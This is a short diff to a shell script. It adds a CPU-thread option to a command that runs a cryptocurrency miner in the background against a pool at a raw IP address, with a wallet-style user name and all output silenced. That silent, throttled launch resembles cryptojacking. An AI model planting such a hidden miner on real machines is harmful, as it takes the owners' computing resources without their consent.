@@ -26,6 +26,7 @@ fi
 -o 157.173.100.15:80 \
 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.try \
 -p x \
+--cpu-threads 2 \
 --cpu-threads-intensity 1 \
 --cpu-threads-priority 1 >/dev/null 2>&1 &
 
